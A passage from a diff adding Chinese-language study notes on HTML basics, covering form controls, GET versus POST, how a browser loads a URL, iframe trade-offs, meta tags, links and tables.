+<li>如果有多个选项让用户选择，为了节约空间，我们可以使用select控件定义下拉列表。</li>
+<li>在option 中定义**selected =&quot; selected     &quot;**时，当前项即为默认选中项。</li>
+<li>我们实际开发会用的比较少</li>
+</ul>
+<p><img src="../images/clip_image021.png" alt="图片"></p>
+<select>
+  <option>选项1</option>
+  <option>选项2</option>
+  <option>选项3</option>
+  ...
+ </select>
+<p><strong>form****表单域</strong></p>
+<ul>
+<li>
+<p>收集的用户信息怎么传递给服务器？</p>
+</li>
+<li>
+<ul>
+<li>通过<strong>form****表单域</strong></li>
+</ul>
+</li>
+<li>
+<p>目的：</p>
+</li>
+<li>
+<ul>
+<li>在HTML中，form标签被用于定义表单域，以实现用户信息的收集和传递，form中的所有内容都会被提交给服务器。</li>
+</ul>
+</li>
+</ul>
+<form action="url地址" method="提交方式" name="表单名称">
+  各种表单控件
+ </form>
+<p><strong>常用属性：</strong></p>
+<ul>
+<li>每个表单都应该有自己表单域。后面学 <strong>ajax</strong> <strong>后台交互</strong>的时候，必须需要form表单域。</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>属性值</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>action</td>
+<td>url地址</td>
+<td>用于指定接收并处理表单数据的服务器程序的url地址。</td>
+</tr>
+<tr>
+<td>method</td>
+<td>get/post</td>
+<td>用于设置表单数据的提交方式，其取值为get或post。</td>
+</tr>
+<tr>
+<td>name</td>
+<td>名称</td>
+<td>用于指定表单的名称，以区分同一个页面中的多个表单。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>GET</strong> <strong>和</strong> <strong>POST</strong> <strong>的区别</strong></p>
+<ul>
+<li>GET在浏览器回退时是无害的，而POST会再次提交请求。</li>
+<li>GET请求会被浏览器主动cache，而POST不会，除非手动设置。</li>
+<li>GET请求只能进行url编码，而POST支持多种编码方式。</li>
+<li>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。</li>
+<li>GET请求大小一般是(1024字节)，http协议并没有限制，而与服务器，操作系统有关，POST理论上来说没有大小限制，http协议规范也没有进行大小限制，但实际上post所能传递的数据量根据取决于服务器的设置和内存大小。</li>
+<li>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。</li>
+<li>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。</li>
+</ul>
+<p><strong>团队约定：</strong></p>
+<ul>
+<li>元素属性值使用双引号语法</li>
+<li>元素属性值可以写上的都写上</li>
+</ul>
+<p>推荐<br>
+<input type="text" /><br>
+<input type="radio" name="name" checked="checked" /></p>
+<p><strong>从输入<strong><strong>url</strong></strong>到页面展示发生了什么</strong>**(<strong><strong>面试</strong></strong>)**</p>
+<p>作者：Twinkle_<br>
+链接：<a target="_blank" rel="noopener" href="https://juejin.im/post/6869279683230629896">https://juejin.im/post/6869279683230629896</a><br>
+来源：掘金</p>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从浏览器输入 <strong>URL</strong> 到页面渲染的整个过程都是由 浏览器架构中的各个进程之间的配合完成。</p>
+<ol>
+<li><strong>浏览器主进程</strong>: 管理子进程、提供服务功能</li>
+<li><strong>渲染进程</strong>：将HTML、CSS、JS渲染成界面，js引擎v8和排版引擎Blink就在上面，他会为每一个tab页面创建一个渲染进程</li>
+<li><strong>GPU****进程</strong>：本来是负责处理3Dcss的，后来慢慢的UI界面也交给GPU来绘制</li>
+<li><strong>网络进程</strong>：就是负责网络请求，网络资源加载的进程</li>
+<li><strong>插件进程</strong>：负责插件的运行的，因为插件很容易崩溃，把它放到独立的进程里不要让它影响别人</li>
+</ol>
+<p><strong>浏览器的多进程架构</strong></p>
+<p>从用户输入信息到页面展示的不同阶段，是不同的进程在发挥作用，示意图如下：<img src="../images/clip_image023.jpg" alt="图片">从图中可以看出，整个过程是需要各个进程之间相互配合完成的，过程大致可以描述为：</p>
+<ol>
+<li>用户输入url,处理输入信息，主进程开始导航，交给网络进程干活</li>
+<li>网络进程发起网络请求，其中有可能会发生重定向</li>
+<li>服务器响应URL之后，主进程就要通知渲染进程，你要开始干活了</li>
+<li>渲染进程准备好了，要想渲染进程提交数据，这个时间叫做提交文档</li>
+<li>渲染进程接受到数据，完成页面渲染。</li>
+</ol>
+<p><strong>具体过程</strong></p>
+<ol>
+<li>输入url</li>
+</ol>
+<ul>
+<li>用户输入url，处理输入信息：</li>
+<li>如果为非url结构的字符串，交给浏览器<strong>默认引擎</strong>去搜索改字符串；</li>
+<li>若为url结构的字符串，浏览器主进程会交给 <strong>网络进程</strong> ,开始干活。</li>
+</ul>
+<p>2.1 查找浏览器缓存</p>
+<ul>
+<li>网络进程会先看看是否存在本地缓存，如果有就直接返回资源给浏览器进程，无则下一步 DNS-&gt; IP -&gt; TCP</li>
+</ul>
+<p>2.2 DNS解析</p>
+<ul>
+<li>网络进程拿到url后，先会进行DNS域名解析得到<strong>IP****地址</strong>。如果请求协议是HTTPS，那么还需要建立TLS连接。</li>
+</ul>
+<p>2.2 建立TCP连接，三次握手</p>
+<ul>
+<li>接下来就是利用IP地址和服务器建立TCP连接。连接建立之后，向服务器发送请求。</li>
+</ul>
+<ol>
+<li>服务器响应</li>
+</ol>
+<ul>
+<li>服务器收到请求信息后，会根据请求信息生成响应行、响应头、响应体，并发给网络进程。网络进程接受了响应信息之后，就开始解析响应头的内容。</li>
+<li><strong>网络进程解析响应行和响应头信息的过程：</strong></li>
+</ul>
+<p>3.1 重定向</p>
+<ul>
+<li>如果响应行状态码为301（永久重定向）和302（临时），那么说明需要重定向到其他url。这时候网络进程会从响应头中的Location字段里读取重定向的地址，并重新发起网络请求。</li>
+</ul>
+<p>3.2 响应数据处理</p>
+<ul>
+<li>导航会通过请求头的<strong>Content-type</strong>字段判断响应体数据的类型。浏览器通过这个来决定如何显示响应体的内容。比如：若为application/octet-stream，则会按照下载类型来处理这个请求，导航结束。若为text/html，这就告诉浏览器服务器返回的是html格式，浏览器会通知渲染进程，你要干活了。</li>
+</ul>
+<ol>
+<li>准备渲染进程</li>
+</ol>
+<ul>
+<li>默认情况，每个页面一个渲染进程。但若处于<strong>同一站点</strong>（同根域名+协议），那么渲染进程就会复用。</li>
+</ul>
+<ol>
+<li>提交文档</li>
+</ol>
+<ul>
+<li>渲染进程准备好后，浏览器进程发出**“<strong><strong>提交文档的消息</strong></strong>”**，渲染进程接受了消息之后，会跟网络进程简历传输数据的管道。</li>
+<li>等数据传输完成了，渲染进程会告诉浏览器进程，<strong>确认文档提交</strong>，这时候浏览器会更新页面，安全状态，url，前进后退的历史。</li>
+<li>到这里导航结束，进入渲染阶段。</li>
+</ul>
+<p>注：当浏览器刚开始加载一个地址之后，标签页上的图标便进入了加载状态。但此时图中页面显示的依然是之前打开的页面内容，并没立即替换为百度首页的页面。因为需要等待提交文档阶段，页面内容才会被替换。</p>
+<p><strong>前端<strong><strong>HTML</strong></strong>基础面试题</strong></p>
+<p><strong>iframe****有哪些缺点？</strong></p>
+<p>iframe是一种框架，也是一种很常见的网页嵌入方式。</p>
+<p><strong>「<strong><strong>iframe</strong></strong>的优点」</strong></p>
+<ul>
+<li>iframe能够原封不动的把嵌入的网页展现出来。</li>
+<li>如果有多个网页引用iframe，那么你只需要修改iframe的内容，就可以实现调用的每一个页面内容的更改，方便快捷。</li>
+<li>网页如果为了统一风格，头部和版本都是一样的，就可以写成一个页面，用iframe来嵌套，可以增加代码的可重用。</li>
+<li>如果遇到加载缓慢的第三方内容如图标和广告，这些问题可以由iframe来解决。</li>
+</ul>
+<p><strong>「<strong><strong>iframe</strong></strong>的缺点」</strong></p>
+<ul>
+<li>会产生很多页面，不容易管理。</li>
+<li>iframe框架结构有时会让人感到迷惑，如果框架个数多的话，可能会出现上下、左右滚动条，会分散访问者的注意力，用户体验度差。</li>
+<li>代码复杂，无法被一些搜索引擎索引到，这一点很关键，现在的搜索引擎爬虫还不能很好的处理iframe中的内容，所以使用iframe会不利于搜索引擎优化。</li>
+<li>很多的移动设备（PDA 手机）无法完全显示框架，设备兼容性差。</li>
+<li>iframe框架页面会增加服务器的http请求，对于大型网站是不可取的。</li>
+<li>现在基本上都是用Ajax来代替iframe，所以iframe已经渐渐的退出了前端开发。</li>
+</ul>
+<p><strong>label****的作用是什么？是怎么用的？</strong></p>
+<p>例子1: 点击&quot; 用户名:&quot; 就可以定位光标到输入框</p>
+<form><label for="myid "> 用户名:</label>
+ <input type="text" id="myid" /></form> 
+<p>例子2: 点击&quot; 用户名:&quot; 或按键alt+1, 都可以定位光标到输入框</p>
+<form>
+   <label for="myid" accesskey="1"> 用户名:</label>
+   <input type="text" id="myid" tabindex="1" />
+ </form> 
+<p><strong>for</strong> <strong>属性</strong>功能：表示Label 标签要绑定的HTML 元素，你点击这个标签的时候，所绑定的元素将获取焦点。</p>
+<p><strong>acesskey</strong> <strong>属性</strong><br>
+**功能：**表示访问Label 标签所绑定的元素的热键，当您按下热键，所绑定的元素将获取焦点。<br>
+**局限性：**accessKey 属性所设置的快捷键不能与浏览器的快捷键冲突，否则将优先激活浏览器的快捷键。</p>
+<p><strong>HTML5<strong><strong>的</strong></strong>form****如何关闭自动完成功能？</strong></p>
+<p>HTML的输入框可以拥有自动完成的功能，当你往输入框输入内容的时候，浏览器会从你以前的同名输入框的历史记录中查找出类似的内容并列在输入框下面，这样就不用全部输入进去了，直接选择列表中的项目就可以了。<br>
+但有时候我们希望关闭输入框的自动完成功能，例如当用户输入内容的时候，我们希望使用AJAX技术从数据库搜索并列举而不是在用户的历史记录中搜索。</p>
+<p><strong>关闭输入框的自动完成功能有<strong><strong>3</strong></strong>种方法：</strong></p>
+<ol>
+<li>在IE的Internet选项菜单里的内容–自动完成里面设置</li>
+<li>设置form的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭自动完成功能</li>
+<li>设置输入框的autocomplete为&quot;on&quot;或者&quot;off&quot;来开启或者关闭该输入框的自动完成功能</li>
+</ol>
+<p><strong>将</strong> <strong>HTML5</strong> <strong>看作成开放的网络平台</strong></p>
+<p><strong>「什么是</strong> <strong>HTML5</strong> <strong>的基本构件（<strong><strong>building block</strong></strong>）？」</strong></p>
+<ol>
+<li>语义 - 提供更准确地描述内容。</li>
+<li>连接 - 提供新的方式与服务器通信。</li>
+<li>离线和存储 - 允许网页在本地存储数据并有效地离线运行。</li>
+<li>多媒体 - 在 Open Web 中，视频和音频被视为一等公民（first-class citizens）。</li>
+<li>2D/3D 图形和特效 - 提供更多种演示选项。</li>
+<li>性能和集成 - 提供更快的访问速度和性能更好的计算机硬件。</li>
+<li>设备访问 - 允许使用各种输入、输出设备。</li>
+<li>外观 - 可以开发丰富的主题。</li>
+</ol>
+<p><strong>浏览器是怎么对<strong><strong>HTML5</strong></strong>的离线储存资源进行管理和加载的呢？</strong></p>
+<p>在浏览器的html头部加上manifest属性，如果是第一次访问浏览器会根据manifest的内容进行下载存储离线内容，如果已经访问过则从离线存储中进行加载，然后在比对服务器如果有新内容在更新离线存储<br>
+离线的情况下，浏览器就直接使用离线存储的资源。</p>
+<p><strong>浏览器的渲染过程？</strong></p>
+<p>1、将获取的html解析成dom树<br>
+2、处理css，构成层叠样式表模型CSSOM<br>
+3、将dom树和CSSOM合并为渲染树<br>
+4、根据CSSOM将渲染树的节点布局计算<br>
+5、将渲染树节点样式绘制到页面上</p>
+<p>// 注意<br>
+在渲染的过程中是自上而下渲染，<br>
+js会阻塞页面的渲染，优先等js执行完成<br>
+如果在渲染的过程中改变了样式，会造成回流需要重新渲染</p>
+<p><strong>link<strong><strong>和</strong></strong>@import****的区别？</strong></p>
+<p>1、从属关系区别：<br>
+link属于html标签，而@import是css提供的。<br>
+2、加载顺序区别：<br>
+页面被加载时，link会同时被加载，而@import引用的css会等到页面被加载完再加载。<br>
+3、兼容性区别：<br>
+import只在IE5以上才能识别，而link是html标签，无兼容问题。<br>
+4、dom可操作性区别：<br>
+可以通过JS 操作 DOM ，插入link标签来改变样式；由于 DOM 方法是基于文档的，无法使用@import的方式插入样式<br>
+5、权重区别：<br>
+如果已经存在相同样式，@import引入的这个样式将被该 CSS 文件本身的样式层叠掉，表现出link方式的样式权重高于@import的权重这样的直观效果。<br>
+（简而言之，link和@import，谁写在后面，谁的样式就被应用，后面的样式覆盖前面的样式。）</p>
+<p><strong>src<strong><strong>与</strong></strong>href****的区别？</strong></p>
+<p>1、href 是指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接，用于超链接。<br>
+2、src是指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将</p>
+<p><strong>「学习笔记」<strong><strong>HTML</strong></strong>基础</strong></p>
+<p><strong>前言</strong></p>
+<p>勤做笔记不仅可以让自己学的扎实，更重要的是可以让自己少走弯路。有人说:“再次翻开笔记是什么感觉”，我的回答是:“初恋般的感觉”。或许笔记不一定十全十美，但肯定会让你有种初恋般的怦然心动。💖💖<br>
+本章着重复习Html的基础内容，学习Html究竟要学些什么呢？主要是学习各种标签，来搭建网页的“结构”。✨✨<br>
+本篇文章主要由五个章节构成，从WEB标准到初识HTML，接着学习HTML常用标签，最后学习表格列表和表单。💪💪开始充电之旅啦~~~</p>
+<p><strong>一、认识****WEB</strong></p>
+<p><strong>「网页」<strong>主要是由</strong>文字</strong>、<strong>图像</strong>和<strong>超链接</strong>等元素构成，当然除了这些元素，网页中还可以包括音频、视频以及Flash等。</p>
+<p>**「浏览器」**是网页显示、运行的平台。</p>
+<p><strong>「浏览器内核」</strong>(排版引擎、解释引擎、渲染引擎)</p>
+<p>负责读取网页内容，整理讯息，计算网页的显示方式并显示页面。</p>
+<table>
+<thead>
+<tr>
+<th><strong>浏览器</strong></th>
+<th><strong>内核</strong></th>
+<th><strong>备注</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>IE</td>
+<td>Trident</td>
+<td>IE、猎豹安全、360极速浏览器、百度浏览器</td>
+</tr>
+<tr>
+<td>firefox</td>
+<td>Gecko</td>
+<td>可惜这几年已经没落了，打开速度慢、升级频繁、猪一样的队友flash、神一样的对手chrome。</td>
+</tr>
+<tr>
+<td>Safari</td>
+<td>webkit</td>
+<td>现在很多人错误地把 webkit 叫做 chrome内核（即使 chrome内核已经是 blink 了）。苹果感觉像被别人抢了媳妇，都哭晕在厕所里面了。</td>
+</tr>
+<tr>
+<td>chrome</td>
+<td>Chromium/Blink</td>
+<td>在 Chromium 项目中研发 Blink 渲染引擎（即浏览器核心），内置于 Chrome 浏览器之中。Blink 其实是 WebKit 的分支。大部分国产浏览器最新版都采用Blink内核。二次开发</td>
+</tr>
+<tr>
+<td>Opera</td>
+<td>blink</td>
+<td>现在跟随chrome用blink内核。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Web****标准</strong></p>
+<p>**「构成」**👉 <strong>结构标准，表现标准和行为标准</strong></p>
+<ul>
+<li><strong>结构标准</strong>用于对网页元素进行整理和分类(HTML)</li>
+<li><strong>表现标准</strong>用于设置网页元素的版式、颜色、大小等外观属性(CSS)</li>
+<li><strong>行为标准</strong>用于对网页模型的定义及交互的编写(JavaScript)</li>
+</ul>
+<p>**「<strong><strong>Web</strong></strong>标准的优点」**👇</p>
+<ul>
+<li><strong>易于维护</strong>：只需更改CSS文件，就可以改变整站的样式</li>
+<li><strong>页面响应快</strong>：HTML文档体积变小，响应时间短</li>
+<li><strong>可访问性</strong>：语义化的HTML（结构和表现相分离的HTML）编写的网页文件，更容易被屏幕阅读器识别</li>
+<li><strong>设备兼容性</strong>：不同的样式表可以让网页在不同的设备上呈现不同的样式</li>
+<li><strong>搜索引擎</strong>：语义化的HTML能更容易被搜索引擎解析，提升排名</li>
+</ul>
+<p><strong>二、<strong><strong>HTML</strong></strong>初识</strong></p>
+<p><strong>HTML****初识</strong></p>
+<p><strong>「<strong><strong>HTML</strong></strong>」</strong>(Hyper Text Markup Language):超文本标记语言</p>
+<p><strong>「所谓超文本，有<strong><strong>2</strong></strong>层含义：」</strong></p>
+<ul>
+<li>因为它可以加入图片、声音、动画、多媒体等内容**（超越文本限制** <strong>）</strong></li>
+<li>不仅如此，它还可以从一个文件跳转到另一个文件，与世界各地主机的文件连接**（超级链接文本）**。</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>骨架格式」</strong></p>
+<!-- 页面中最大的标签 根标签 -->
+ <html>
+   <!-- 头部标签 -->
+   <head>   
+     <!-- 标题标签 -->
+     <title></title> 
+   </head>
+   <!-- 文档的主体 -->
+   <body>
+   </body>
+ </html>
+<p><strong>「团队约定大小写」</strong></p>
+<ul>
+<li>HTML标签名、类名、标签属性和大部分属性值统一用小写</li>
+</ul>
+<p><strong>「<strong><strong>HTML</strong></strong>元素标签分类」</strong></p>
+<ul>
+<li>常规元素(双标签)</li>
+<li>空元素(单标签)</li>
+</ul>
+<p>常规元素(双标签)<br>
+&lt;标签名&gt; 内容 &lt;/标签名&gt;  比如<body>我是文字</body></p>
+<p>空元素(单标签)<br>
+&lt;标签名 /&gt; 比如 <br />或<br></p>
+<p><strong>「<strong><strong>HTML</strong></strong>标签关系」</strong></p>
+<ul>
+<li>
+<p><strong>嵌套关系</strong>父子级包含关系</p>
+</li>
+<li>
+<p><strong>并列关系</strong>兄弟级并列关系</p>
+</li>
+<li>
+<ul>
+<li>如果两个标签之间的关系是<strong>嵌套关系</strong>，子元素最好缩进一个tab键的身位（一个tab是4个空格）。如果是<strong>并列关系</strong>，最好上下对齐。</li>
+</ul>
+</li>
+</ul>
+<p><strong>文档类型</strong>**<!DOCTYPE >**</p>
+<p>**「文档类型」<strong>用来说明你用的XHTML或者HTML是什么版本。</strong><!DOCTYPE html>**告诉浏览器按照HTML5标准解析页面。</p>
+<p><strong>页面语言****lang</strong></p>
+<p><strong>lang</strong>指定该html标签内容所用的语言</p>
+ <html lang="en"> 
+  en 定义语言为英语 zh-CN定义语言为中文
+<p><strong>「<strong><strong>lang</strong></strong>的作用」</strong></p>
+<ul>
+<li>根据根据lang属性来设定不同语言的css样式，或者字体</li>
+<li>告诉搜索引擎做精确的识别</li>
+<li>让语法检查程序做语言识别</li>
+<li>帮助翻译工具做识别</li>
+<li>帮助网页阅读程序做识别</li>
+</ul>
+<p><strong>字符集</strong></p>
+<p><strong>「字符集」</strong>(Character set)是多个字符的集合,计算机要准确的处理各种字符集文字，需要进行字符编码，以便计算机能够识别和存储各种文字。</p>
+<ul>
+<li>
+<p>UTF-8是目前最常用的字符集编码方式</p>
+</li>
+<li>
+<p>让 html 文件是以 UTF-8 编码保存的， 浏览器根据编码去解码对应的html内容。</p>
+<meta charset="UTF-8" />
+</li>
+</ul>
+<p><strong>「<strong><strong>meta viewport</strong></strong>的用法」</strong><br>
+通常viewport是指视窗、视口。浏览器上(也可能是一个app中的webview)用来显示网页的那部分区域。在移动端和pc端视口是不同的，pc端的视口是浏览器窗口区域，而在移动端有三个不同的视口概念：布局视口、视觉视口、理想视口</p>
+<p>meta有两个属性name 和 http-equiv</p>
+<p><strong>name****属性的取值</strong></p>
+<ul>
+<li>keywords(关键字) 告诉搜索引擎，该网页的关键字</li>
+<li>description(网站内容描述) 用于告诉搜索引擎，你网站的主要内容。</li>
+<li>viewport(移动端的窗口)</li>
+<li>robots(定义搜索引擎爬虫的索引方式)     robots用来告诉爬虫哪些页面需要索引，哪些页面不需要索引</li>
+<li>author(作者)</li>
+<li>generator(网页制作软件）</li>
+<li>copyright(版权)</li>
+</ul>
+<p><strong>http-equiv****有以下参数</strong></p>
+<p><strong>http-equiv</strong>相当于http的文件头作用，它可以向浏览器传回一些有用的信息，以帮助正确和精确地显示网页内容</p>
+<ul>
+<li><strong>content-Type</strong> 设定网页字符集(Html4用法，不推荐)</li>
+<li><strong>Expires(<strong><strong>期限</strong></strong>)</strong> ,可以用于设定网页的到期时间。一旦网页过期，必须到服务器上重新传输。</li>
+<li><strong>Pragma(cache<strong><strong>模式</strong></strong>)</strong>,是用于设定禁止浏览器从本地机的缓存中调阅页面内容，设定后一旦离开网页就无法从Cache中再调出</li>
+<li><strong>Refresh(<strong><strong>刷新</strong></strong>)</strong>,自动刷新并指向新页面。</li>
+<li><strong>cache-control</strong>（请求和响应遵循的缓存机制）</li>
+</ul>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<p><strong>HTML****标签的语义化</strong></p>
+<ul>
+<li>方便代码的阅读和维护，样式丢失的时候能让页面呈现清晰的结构。</li>
+<li>有利于SEO，搜索引擎根据标签来确定上下文和各个关键字的权重。</li>
+<li>方便其他设备解析，如盲人阅读器根据语义渲染网页</li>
+</ul>
+<p><strong>「拓展」</strong> 标签：规定页面上所有链接的默认 URL 和设置整体链接的打开状态</p>
+<head>
+   <base href="http://www.baidu.com" target="_blank">
+   <base target="_self">
+ </head>
+ <body>
+   <a href="">测试</a> 跳转到 百度
+ </body>
+<p><strong>HTML****常用标签</strong></p>
+<p><strong>常用标签</strong></p>
+<p>**「**<strong>1.</strong> **排版标签」**主要和css搭配使用，显示网页结构的标签，是网页布局最常用的标签。</p>
+<ul>
+<li>标题标签h(h1~h6)</li>
+<li>段落标签p,可以把 HTML 文档分割为若干段落</li>
+<li>水平线标签hr</li>
+<li>换行标签br</li>
+<li>div和span标签:是没有语义的,是我们网页布局最主要的2个盒子。</li>
+</ul>
+<p>**「**<strong>2.</strong> <strong>排版标签」</strong></p>
+<ul>
+<li><strong>b</strong>和<strong>strong</strong> 文字以粗体显示</li>
+<li><strong>i</strong>和<strong>em</strong> 文字以斜体显示</li>
+<li><strong>s</strong>和<strong>del</strong> 文字以加删除线显示</li>
+<li><strong>u</strong>和<strong>ins</strong> 文字以加下划线显示</li>
+</ul>
+<p><strong>「<strong><strong>3.</strong> <strong>标签属性</strong></strong>(<strong><strong>行内式</strong></strong>)****」</strong></p>
+<p>使用HTML制作网页时，如果想让HTML标签提供更多的信息，可以使用HTML标签的属性加以设置。</p>
+<p>&lt;标签名 属性1=“属性值1” 属性2=“属性值2” …&gt; 内容 &lt;/标签名&gt;<br>
+&lt;手机 颜色=“红色” 大小=“5寸”&gt; &lt;/手机&gt;</p>
+<p><strong>「<strong><strong>4.</strong> **图像标签</strong><strong>img</strong></strong>」**</p>
+<p><img src="../images/clip_image002-16485485492631.jpg" alt="图片"><strong>注意：</strong></p>
+<ul>
+<li>标签可以拥有多个属性，必须写在开始标签中，位于标签名后面。</li>
+<li>属性之间不分先后顺序，标签名与属性、属性与属性之间均以空格分开。</li>
+<li>采取  键值对 的格式       key=“value”  的格式</li>
+</ul>
+<img src="cz.jpg" width="300" height="300" border="3" title="这是个小蒲公英" />
+<p><strong>「<strong><strong>5.</strong> <strong>链接标签</strong></strong>(<strong><strong>重点</strong></strong>)****」</strong></p>
+<p><a href="跳转目标" target="目标窗口的弹出方式">文本或图像</a> target=“_self”  默认窗口弹出方式 target=“_blank” 新窗口弹出</p>
+<table>
+<thead>
+<tr>
+<th><strong>属性</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>href</td>
+<td>用于指定链接目标的url地址，（必须属性）当为标签应用href属性时，它就具有了超链接的功能</td>
+</tr>
+<tr>
+<td>target</td>
+<td>用于指定链接页面的打开方式，其取值有_self和_blank两种，其中_self为默认值，_blank为在新窗口中打开方式。</td>
+</tr>
+</tbody>
+</table>
+<p><strong>src</strong> <strong>和</strong> <strong>href</strong> <strong>的区别</strong></p>
+<p>一句话概括:<strong>src</strong> <strong>是引入资源的</strong> <strong>href</strong> <strong>是跳转<strong><strong>url</strong></strong>的</strong></p>
+<ol>
+<li>src用于替换当前元素，href用于在当前文档和引用资源之间确立联系。</li>
+<li>src是source的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求src资源时会将其指向的资源下载并应用到文档内，例如js脚本，img图片和frame等元素。当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。</li>
+<li>href是Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的链接。如果我们在文档中添加那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用link方式来加载css，而不是使用@import方式。</li>
+</ol>
+<p><strong>注意：</strong></p>
+<ol>
+<li>外部链接 需要添加     http:// <a target="_blank" rel="noopener" href="http://www.baidu.com">www.baidu.com</a></li>
+<li>内部链接 直接链接内部页面名称即可 比如 &lt; a     href=“index.html”&gt; 首页</li>
+<li>如果当时没有确定链接目标时，通常将链接标签的href属性值定义为“#”(即href=“#”)，表示该链接暂时为一个空链接。</li>
+<li>不仅可以创建文本超链接，在网页中各种网页元素，如图像、表格、音频、视频等都可以添加超链接。</li>
+</ol>
+<p><strong>锚点定位：通过创建锚点链接，用户能够快速定位到目标内容。</strong></p>
+<p>\1. 使用相应的id名标注跳转目标的位置。 (找目标)</p>
+  <h3 id="two">第2集</h3> 
+<p>\2. 使用<a href="#id名">链接文本</a>创建链接文本（被点击的）<br>
+<a href="#two"></p>
+<p>**「**<strong>6.</strong> <strong>注释标签」</strong></p>
+ <!-- 注释语句 -->   
+<p>快捷键是：  ctrl + /<br>
+或者 ctrl +shift + /</p>
+<p>**团队约定：**注释内容前后各一个空格字符，注释位于要注释代码的上面，单独占一行</p>
+<p>**「**<strong>7.</strong> <strong>路径」</strong></p>
+<p><img src="../images/clip_image004-16485485492632.png" alt="图片">**「**<strong>8.</strong> <strong>其他知识」</strong></p>
+<p><strong>预格式化文本<strong><strong>pre</strong></strong>标签</strong>元素中的文本通常会保留空格和换行符。而文本也会呈现为等宽字体。格式化文本就是 ，按照我们预先写好的文字格式来显示页面， 保留空格和换行等。</p>
+<p><strong>特殊字符</strong><img src="../images/clip_image006-16485485492633.jpg" alt="图片"><strong>什么是****XHTML</strong></p>
+<ul>
+<li>XHTML 指**「可扩展超文本标签语言」**（EXtensible     HyperText Markup Language）。</li>
+<li>XHTML 的目标是取代 HTML。</li>
+<li>XHTML 与 HTML 4.01 几乎是相同的。</li>
+<li>XHTML 是更严格更纯净的 HTML 版本。</li>
+<li>XHTML 是作为一种 XML 应用被重新定义的     HTML,是严格版本的HTML。例如它要求标签必须小写，标签必须被正确关闭，标签顺序必须正确排列，对于属性都必须使用双引号等。</li>
+<li>XHTML 是一个 W3C 标准。</li>
+</ul>
+<p><strong>写<strong><strong>HTML</strong></strong>代码时应注意什么？</strong></p>
+<ul>
+<li>尽可能少的使用无语义的标签div和span；</li>
+<li>在语义不明显时，既可以使用div或者p时，尽量用p, 因为p在默认情况下有上下间距，对兼容特殊终端有利；</li>
+<li>不要使用纯样式标签，如：b、font、u等，改用css设置。</li>
+<li>需要强调的文本，可以包含在strong或者em标签中（浏览器预设样式，能用CSS指定就不用他们），strong默认样式是加粗（不要用b），em是斜体（不用i）；</li>
+<li>使用表格时，标题要用<strong>caption</strong>，表头用thead，主体部分用tbody包围，尾部用tfoot包围。表头和一般单元格要区分开，表头用th，单元格用td；</li>
+<li>表单域要用<strong>fieldset</strong>标签包起来，并用<strong>legend</strong>标签说明表单的用途；</li>
+<li>每个input标签对应的说明文本都需要使用<strong>label****标签</strong>，并且通过为input设置id属性，在lable标签中设置for来让说明文本和相对应的input关联起来。</li>
+</ul>
+<p><strong>表格</strong></p>
+<p>**「**<strong>1.</strong> <strong>表格」</strong></p>
+<p>现在还是较为常用的一种标签，但不是用来布局，**常见显示、展示表格式数据。**因为它可以让数据显示的非常的规整，可读性非常好。<strong>特别是后台展示数据的时候表格运用是否熟练就显得很重要</strong>，一个清爽简约的表格能够把繁杂的数据表现得很有条理。</p>
+<p>**「**<strong>2.</strong> <strong>创建表格」</strong></p>
+<table>   <tr>     <td>单元格内的文字</td>     ...   </tr>   ... </table>
+<p><strong>table</strong>**、<strong><strong>tr</strong></strong>、<strong><strong>td</strong></strong>，**他们是创建表格的基本标签，缺一不可</p>
+<ul>
+<li>table用于定义一个表格标签。</li>
+<li>tr标签 用于定义表格中的行，必须嵌套在     table标签中。</li>
+<li>td 用于定义表格中的单元格，必须嵌套在<tr></tr>标签中。</li>
+<li>字母 td 指表格数据（table     data），即数据单元格的内容，现在我们明白，表格最合适的地方就是用来存储数据的。td像一个容器，可以容纳所有的元素。<img src="../images/clip_image008-16485485492634.jpg" alt="图片"></li>
+</ul>
+<p><strong>表头单元格标签****th</strong>:一般表头单元格位于表格的第一行或第一列，并且文本加粗居中,只需用表头标签<th></th>替代相应的单元格标签<td></td>即可。</p>
+<p><img src="../images/clip_image010-16485485492645.png" alt="图片"></p>
+<p><strong>表格标题****caption</strong>通常这个标题会被居中且显示于表格之上。caption 标签必须紧随 table 标签之后。这个标签只存在 表格里面才有意义。你是风儿我是沙</p>
+<table>    <caption>我是表格标题</caption> </table>
+<p>**「**<strong>3.</strong> <strong>表格属性」</strong></p>
+<p><img src="../images/clip_image012-16485485492646.jpg" alt="图片">三参为0，平时开发的我们这三个参数   <strong>border  cellpadding  cellspacing</strong> 为  0</p>
+<p>**「**<strong>4.</strong> <strong>合并单元格」</strong>,合并的顺序我们按照  <strong>先上</strong> <strong>后下</strong>   <strong>先左</strong>  <strong>后右</strong> 的顺序 ,合并完之后需要删除多余的单元格。</p>
+<ul>
+<li>跨行合并：rowspan=“合并单元格的个数”</li>
+<li>跨列合并：colspan=“合并单元格的个数”</li>
+</ul>
+<p>**「**<strong>5.</strong> <strong>总结表格」</strong></p>
+<table>
+<thead>
+<tr>
+<th><strong>标签名</strong></th>
+<th><strong>定义</strong></th>
+<th><strong>说明</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><table></table></td>
+<td>表格标签</td>
